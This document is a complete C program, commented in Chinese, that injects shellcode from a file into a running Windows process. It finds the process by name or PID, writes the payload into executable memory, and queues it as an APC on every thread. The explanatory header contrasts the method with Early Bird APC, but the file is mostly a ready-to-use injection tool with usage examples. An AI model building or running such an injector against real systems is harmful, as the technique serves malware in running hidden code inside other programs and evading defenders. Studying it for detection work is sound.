/*
 * APC Queue Injection
 *
 * 向运行中进程的所有线程的 APC 队列注入 shellcode
 *
 * 核心原理：
 * - 枚举目标进程的所有线程
 * - 对每个线程调用 QueueUserAPC，将 shellcode 地址作为 APC 回调
 * - 当线程进入 alertable 状态时，APC 被执行
 *
 * 与 Early Bird APC 的区别：
 * - Early Bird: 进程启动前（挂起状态）注入 APC
 * - APC Queue: 运行时向所有线程注入 APC
 *
 * Alertable 状态：
 * - SleepEx(dwMilliseconds, TRUE)
 * - WaitForSingleObjectEx(hObject, dwMilliseconds, TRUE)
 * - WaitForMultipleObjectsEx(...)
 * - MsgWaitForMultipleObjectsEx(...)
 * - SignalObjectAndWait(...)
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// ========================================
// 函数声明
// ========================================

DWORD GetProcessIdByName(const char *processName);
BOOL InjectShellcodeToProcess(DWORD pid, unsigned char *shellcode, size_t shellcode_size);
DWORD* EnumerateProcessThreads(DWORD pid, DWORD *threadCount);

// ========================================
// 主函数
// ========================================

int main(int argc, char *argv[])
{
    printf("========================================\n");
    printf("  APC Queue Injection\n");
    printf("  运行时 APC 队列注入\n");
    printf("========================================\n\n");

    if (argc != 3) {
        printf("用法: %s <目标进程名或PID> <shellcode文件>\n", argv[0]);
        printf("示例: %s notepad.exe payload.bin\n", argv[0]);
        printf("      %s 1234 payload.bin\n", argv[0]);
        return 1;
    }

    // 解析参数
    const char *target = argv[1];
    const char *shellcode_path = argv[2];

    // 读取 shellcode
    FILE *fp = fopen(shellcode_path, "rb");
    if (!fp) {
        printf("[!] 无法打开 shellcode 文件: %s\n", shellcode_path);
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char *)malloc(shellcode_size);
    if (!shellcode) {
        printf("[!] 内存分配失败\n");
        fclose(fp);
        return 1;
    }

    fread(shellcode, 1, shellcode_size, fp);
    fclose(fp);

    printf("[+] 已读取 shellcode: %lu 字节\n", (unsigned long)shellcode_size);

    // 获取目标进程 PID
    DWORD targetPid = 0;
    if (isdigit(target[0])) {
        targetPid = atoi(target);
    } else {
        targetPid = GetProcessIdByName(target);
        if (targetPid == 0) {
            printf("[!] 未找到进程: %s\n", target);
            free(shellcode);
            return 1;
        }
    }

    printf("[*] 目标进程 PID: %lu\n", targetPid);

    // 执行注入
    BOOL success = InjectShellcodeToProcess(targetPid, shellcode, shellcode_size);

    free(shellcode);

    if (success) {
        printf("\n[+] APC 队列注入完成！\n");
        printf("[*] 当目标线程进入 alertable 状态时，shellcode 将被执行\n");
        return 0;
    } else {
        printf("\n[!] APC 队列注入失败\n");
        return 1;
    }
}

// ========================================
// 核心注入函数
// ========================================

BOOL InjectShellcodeToProcess(DWORD pid, unsigned char *shellcode, size_t shellcode_size)
{
    HANDLE hProcess = NULL;
    LPVOID remoteMemory = NULL;
    DWORD *threads = NULL;
    DWORD threadCount = 0;
    BOOL result = FALSE;

    // 1. 打开目标进程
    printf("\n[*] 步骤 1: 打开目标进程...\n");
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[!] 无法打开目标进程: %lu (错误: %lu)\n", pid, GetLastError());
        return FALSE;
    }
    printf("[+] 已打开目标进程，句柄: 0x%p\n", hProcess);

    // 2. 在目标进程分配内存
    printf("[*] 步骤 2: 分配远程内存...\n");
    remoteMemory = VirtualAllocEx(hProcess, NULL, shellcode_size,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        printf("[!] VirtualAllocEx 失败: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] 已分配远程内存: 0x%p (大小: %lu 字节)\n", remoteMemory, (unsigned long)shellcode_size);

    // 3. 写入 shellcode
    printf("[*] 步骤 3: 写入 shellcode...\n");
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcode_size, &bytesWritten)) {
        printf("[!] WriteProcessMemory 失败: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] 已写入 %lu 字节\n", (unsigned long)bytesWritten);

    // 4. 枚举目标进程的线程
    printf("[*] 步骤 4: 枚举目标进程线程...\n");
    threads = EnumerateProcessThreads(pid, &threadCount);
    if (!threads || threadCount == 0) {
        printf("[!] 未找到目标进程的线程\n");
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] 找到 %lu 个线程\n", threadCount);

    // 5. 向每个线程的 APC 队列注入
    printf("[*] 步骤 5: 向线程 APC 队列注入...\n");
    DWORD successCount = 0;
    for (DWORD i = 0; i < threadCount; i++) {
        DWORD threadId = threads[i];

        // 打开线程
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
        if (!hThread) {
            printf("  [!] 无法打开线程 %lu: %lu\n", threadId, GetLastError());
            continue;
        }

        // 队列 APC
        DWORD apcResult = QueueUserAPC((PAPCFUNC)remoteMemory, hThread, 0);
        if (apcResult == 0) {
            printf("  [!] QueueUserAPC 失败，线程 %lu: %lu\n", threadId, GetLastError());
        } else {
            printf("  [+] APC 已队列到线程 %lu\n", threadId);
            successCount++;
        }

        CloseHandle(hThread);
        Sleep(100);  // 短暂延迟
    }

    printf("[+] 成功向 %lu/%lu 个线程队列 APC\n", successCount, threadCount);

    if (successCount > 0) {
        result = TRUE;
    }

    // 清理
    free(threads);
    CloseHandle(hProcess);

    return result;
}

// ========================================
// 枚举进程线程
// ========================================

DWORD* EnumerateProcessThreads(DWORD pid, DWORD *threadCount)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        *threadCount = 0;
        return NULL;
    }

    THREADENTRY32 te32 = {0};
    te32.dwSize = sizeof(THREADENTRY32);

    // 第一次遍历：计算线程数量
    DWORD count = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                count++;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    if (count == 0) {
        CloseHandle(hSnapshot);
        *threadCount = 0;
        return NULL;
    }

    // 分配数组
    DWORD *threads = (DWORD *)malloc(count * sizeof(DWORD));
    if (!threads) {
        CloseHandle(hSnapshot);
        *threadCount = 0;
        return NULL;
    }

    // 第二次遍历：收集线程 ID
    DWORD index = 0;
    te32.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                threads[index++] = te32.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    *threadCount = count;
    return threads;
}

// ========================================
// 根据进程名获取 PID
// ========================================

DWORD GetProcessIdByName(const char *processName)
{
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    DWORD pidFound = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pidFound = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pidFound;
}
